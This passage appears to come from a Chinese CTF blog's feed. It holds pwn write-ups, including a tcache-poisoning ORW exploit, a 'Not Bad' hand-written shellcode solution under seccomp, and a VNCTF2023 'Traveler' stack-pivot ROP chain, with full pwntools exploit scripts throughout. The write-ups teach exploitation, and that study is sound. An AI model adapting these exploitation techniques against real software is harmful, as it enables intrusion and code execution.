class="line">    io.recvuntil(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add()</span><br><span class="line"></span><br><span class="line">add()<span class="comment">#7</span></span><br><span class="line">add()<span class="comment">#8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">1</span>,<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">io.recv()</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1</span>-<span class="number">96</span></span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">7</span>,<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">heap_addr = key &lt;&lt; <span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">environ_addr = libc_addr + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()  <span class="comment">#9-13</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(environ_addr ^ key))</span><br><span class="line">add()<span class="comment">#14</span></span><br><span class="line">add()<span class="comment">#15</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">io.recv()</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x168</span></span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">8</span>,p64(stack_addr^key))</span><br><span class="line">add()<span class="comment">#16</span></span><br><span class="line">add()<span class="comment">#17</span></span><br><span class="line">rdi_addr = libc_addr + libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)).__next__()</span><br><span class="line">rsi_addr = libc_addr + libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)).__next__()</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x00000000000c7f32</span></span><br><span class="line"><span class="comment"># rax_addr = libc_addr + 0x0000000000044c70</span></span><br><span class="line"><span class="comment"># syscall = libc_addr + 0x0000000000026858</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#open</span></span><br><span class="line"><span class="comment">#flag_addr = stack_addr +0x10</span></span><br><span class="line">flag_addr = heap_addr + <span class="number">0x2a0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">1</span>+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">3</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">1</span>) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(<span class="number">0x50</span>) + p64(write_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1541)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">edit(<span class="number">17</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战 2019 Not Bad</title>
      <link href="/2023/02/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/"/>
      <url>/2023/02/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>手写shellcode 但是比较简单 记录一下思路</p><p>保护机制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>ida看一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp();</span><br><span class="line">  buffer();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mmap开辟了一块内存 地址从0x123000 - 0x124000 权限是可写可执行</p><p>还有三个函数 跟进一下看看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开沙盒了 看看限制了啥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>只能允许open read write三个函数 那就是orw了</p><p>接着跟进下一个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">buffer</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>清空了缓存区 这个没啥好说的 跟进下一个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给了一次0x10字节栈溢出的机会 这种情况下大概率就是手写shellcode了 应该是有哪个地方给了jmp rsp指令 ropgadget找一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chen@chen-virtual-machine:~$ ROPgadget --binary pwn --only &#x27;jmp|rsp&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004002d8 : jmp 0x4002ad</span><br><span class="line">0x000000000040078b : jmp 0x400770</span><br><span class="line">0x00000000004008eb : jmp 0x400880</span><br><span class="line">0x0000000000400b03 : jmp 0x400b7a</span><br><span class="line">0x0000000000400b87 : jmp qword ptr [rax - 0x68000000]</span><br><span class="line">0x0000000000400ceb : jmp qword ptr [rbp]</span><br><span class="line">0x0000000000400865 : jmp rax</span><br><span class="line">0x0000000000400a01 : jmp rsp</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 8</span><br></pre></td></tr></table></figure><p>果然有一个 不过由于0x10还要算上jmp rsp 那么给shellcode的字节就只有8字节了 这显然是啥也干不了的 gdb动调看了下寄存器 都要我们重新赋值 这个时候可以利用sub rsp来往上抬栈 从而使得原本是用垃圾数据填充的部分可以被我们利用起来</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26981</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./locate&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./buu_libc_ubuntu16_64&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">magic_addr = <span class="number">0x123000</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov edx,200</span></span><br><span class="line"><span class="string">mov rsi,0x123500</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode2 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sub rsp,0x30</span></span><br><span class="line"><span class="string">jmp rsp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = asm(shellcode).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(jmp_rsp)+asm(shellcode2)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x400A4A&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">shellcode3 = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>))</span><br><span class="line">shellcode3 += asm(shellcraft.read(<span class="number">3</span>,magic_addr+<span class="number">0x50</span>,<span class="number">0x50</span>))</span><br><span class="line">shellcode3 += asm(shellcraft.write(<span class="number">1</span>,magic_addr+<span class="number">0x50</span>,<span class="number">0x50</span>))</span><br><span class="line">io.send(shellcode3)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2023</title>
      <link href="/2023/02/18/VNCTF2023/"/>
      <url>/2023/02/18/VNCTF2023/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="Traveler"><a href="#Traveler" class="headerlink" title="Traveler"></a>Traveler</h2><p>保护机制</p><p><a href="https://pic.imgdb.cn/item/63f0e219f144a010074c4358.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f0e219f144a010074c4358.png"></a></p><p>ida 两个关键函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;who r u?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many travels can a person have in his life?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;msg, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">boynextdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>boynextdoor函数只能输出flag字符串 而非flag文件内容 单纯的提供了system函数 所以这里大胆猜测这题不用泄露libc基址</p><p>回到main函数 提供了两次read 一次可以溢出0x10字节的数据  一次往bss段写数据 再加上提供了system函数 所以这里一开始是想的很简单 直接栈迁移到bss段上 构造system(“&#x2F;bin&#x2F;sh”)  但是很快发现打不通<br><a href="https://pic.imgdb.cn/item/63f0e5b8f144a01007568526.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f0e5b8f144a01007568526.png"></a></p><p>执行流卡在了这里 此时的rsp位于0x403d00 问题可能出在这里 因为这题的bss段的位置实在是太奇怪了 按理来说64位的二进制程序中bss段一般都是0x600000往后的</p><p><a href="https://pic.imgdb.cn/item/63f0e658f144a010075817d8.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f0e658f144a010075817d8.png"></a></p><p>可以看到0x403000 - 0x404000 是只有可读权限的 只有在0x404000 - 0x405000之间才有写权限</p><p>所以此时rsp执行到了0x403d00以后 没有办法继续写入内容了 故无法成功执行system</p><p>那么此时就是想办法抬高栈帧 一开始是打算构造read来往高地址重新写入rop链 随后返回main函数重新栈迁移</p><p>但是再次执行read函数的时候 rsi寄存器受到了污染 不在指向原本的栈地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000040121A                 mov     edx, 30h ; &#x27;0&#x27;  ; nbytes</span><br><span class="line">.text:000000000040121F                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401222                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401227                 call    _read</span><br></pre></td></tr></table></figure><p>不过联想到了西湖论剑的calc的做法 在bss段构造rop链 写入的地址紧跟在rop链后 这样就可以循环执行</p><p>具体可以去看我相关的博客</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25261)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./locate&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;who r u?&quot;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x4011dd</span></span><br><span class="line">leave_addr = <span class="number">0x0000000000401253</span></span><br><span class="line">bss_addr = <span class="number">0x4040A0</span></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)+p64(bss_addr)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">rdi_addr = <span class="number">0x4012c3</span></span><br><span class="line">system_addr = <span class="number">0x4011EC</span></span><br><span class="line">puts_plt = <span class="number">0x401070</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = <span class="number">0x4010b0</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_got = elf.got[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;How many travels can a person have in his life?&quot;</span>)</span><br><span class="line">read_addr = <span class="number">0x4010a0</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x00000000004012c1</span></span><br><span class="line">add_rsp = <span class="number">0x0000000000401016</span></span><br><span class="line">rsp_addr = <span class="number">0x00000000004012bd</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(rsi_r15_addr)+p64(<span class="number">0x4040c8</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401254&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = p64(ret_addr)+p64(rsi_r15_addr)+p64(<span class="number">0x4040f0</span>)+p64(<span class="number">0x4040f0</span>)+p64(read_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    payload = p64(ret_addr)+p64(rsi_r15_addr)+p64(<span class="number">0x4040f0</span>+<span class="number">0x28</span>*i)+p64(<span class="number">0x4040f0</span>+<span class="number">0x28</span>*i)+p64(read_addr)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(ret_addr)+p64(ret_addr)+p64(rdi_addr)+p64(<span class="number">0x4040a0</span>)+p64(system_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>另外再借助猫神的exp以其他做法复现了一遍 收获也很大 记录一下</p><p>我觉得十分有必要逐步分析</p><p>首先 我们的栈空间不够 所以需要往高地址写入rop链再迁移过去 这是最开始的思路</p><p>起初我是认为第二次main函数的read的rsi参数被破坏了 这是因为我用的是垃圾数据覆盖rbp  在复现第二题的时候意识到了这个问题</p><p>而其rsi寄存器的值实际上是取rbp-0x20处的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000040121A                 mov     edx, 30h ; &#x27;0&#x27;  ; nbytes</span><br><span class="line">.text:000000000040121F                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401222                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401227                 call    _read</span><br></pre></td></tr></table></figure><p>所以如果我们适当调整rbp的值 这里的read就可以做到任意写</p><p>我们预想的情况还是在bss段上通过连续的rop链来牢牢掌握住程序控制流</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pad0 = <span class="string">b&quot;a&quot;</span>*<span class="number">0x20</span>+p64(<span class="number">0x4040c0</span>+<span class="number">0x20</span>)+p64(<span class="number">0x401216</span>)</span><br></pre></td></tr></table></figure><p>这一段payload用来供第一次main函数的第一个read函数读入</p><p>用来覆盖rbp的0x4040c0这个可以先忽略 在实际做题中暂且认为其是一个变量  值为0x4040a0+len(payload) 此处的payload为第一次main函数第二次read读入的rop链长度</p><p>此时程序执行到了第二次read这里 读入的首地址是0x4040a0</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read_rop = p64(pop_rsi_r15)+p64(<span class="number">0x4048d8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">read_rop += p64(read_plt)+p64(pop_rbp)</span><br></pre></td></tr></table></figure><p>gdb动调查看各个寄存器的值 发现我们只需要修改rsi寄存器的值就可以构造read函数 读入的地址挑选一个高地址处的  抬高栈帧</p><p>接下来 程序继续运行 跳转到了0x401216 再次执行一次read</p><p>但是要注意在栈帧结束时的leave指令 此时使得rbp指向了0x4040e0</p><p>于是我们这时候执行的read参数为</p><p><a href="https://pic.imgdb.cn/item/63f38ae1f144a010071df3de.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f38ae1f144a010071df3de.png"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p64(pop_rbp)+p64(<span class="number">0x4048d8</span>)+p64(leave_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0x4040a0</span>-<span class="number">8</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure><p>这一段payload主要是用来进行栈迁移到高地址处 通过弹出0x4048d8给rbp寄存器 leave_ret将栈迁移到了0x4048d8</p><p>接着程序执行流执行到了第二次main函数的第二次read</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read_rop = p64(pop_rsi_r15)+p64(<span class="number">0x4048d8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">read_rop += p64(read_plt)+p64(pop_rbp)</span><br></pre></td></tr></table></figure><p>这个read读入的首地址仍然是0x4040a0 所以和第一次main读入一样的数据就行了</p><p>随后 第二次main函数准备结束栈帧 执行leave|ret两条指令</p><p><a href="https://pic.imgdb.cn/item/63f38cfdf144a01007215883.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f38cfdf144a01007215883.png"></a></p><p>mov rsp,rbp rsp指向0x4040e8  rbp指向0x404098</p><p><a href="https://pic.imgdb.cn/item/63f38d91f144a010072223bc.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f38d91f144a010072223bc.png"></a></p><p>还记得我们之前往0x4040c0写入的rop链吗 此刻派上用场了 位于0x4040e8的正是leave指令</p><p>执行完leave以后 rbp为0  rsp为0x4040a0 </p><p>此刻程序执行流来到了我们最初往0x4040a0写入的rop链 其再次构造了一次read</p><p>这个read读入地址的首地址为0x4048d8</p><p><a href="https://pic.imgdb.cn/item/63f38fc7f144a01007251f4c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f38fc7f144a01007251f4c.png"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop_sh = p64(<span class="number">0x4048d8</span>)+p64(pop_rdi)+p64(<span class="number">0x4048f8</span>)+p64(system_plt)+<span class="string">b&#x27;/bin/sh&#x27;</span>+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63f39060f144a0100725ea9f.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f39060f144a0100725ea9f.png"></a></p><p>此时程序执行到read函数结束 准备ret到下一个字长处的指令 那么此时就是pop rbp</p><p>接着往下一个字长处是leave_ret 相当于一个栈迁移</p><p>而此时0x4040c8处我们填充的就是0x4048d8 而0x4048d8处我们填充的也是0x4048d8</p><p>所以rsp和rbp此时就完成了一次栈迁移 rsp指向了构造的system</p><p><a href="https://pic.imgdb.cn/item/63f39119f144a0100726d731.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f39119f144a0100726d731.png"></a></p><p>到这里整个程序的执行流就结束了 不过还是没有理解的地方 按理来说</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read_rop = p64(pop_rsi_r15)+p64(<span class="number">0x4048d8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">read_rop += p64(read_plt)+p64(pop_rbp)  </span><br></pre></td></tr></table></figure><p>中的pop_rbp和下面的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p64(pop_rbp)+p64(<span class="number">0x4048d8</span>)+p64(leave_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0x4040a0</span>-<span class="number">8</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure><p>中的pop_rbp所存储的是同一个内存空间 都是0x4040c0 不知道为啥删去前面一个就会导致程序卡死</p><p><a href="https://pic.imgdb.cn/item/63f3919ff144a01007277bef.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f3919ff144a01007277bef.png"></a></p><p>问题貌似出在这一段rop链错位了 0x4040c0应该存放的是pop rbp 而0x4040c8不应该为0 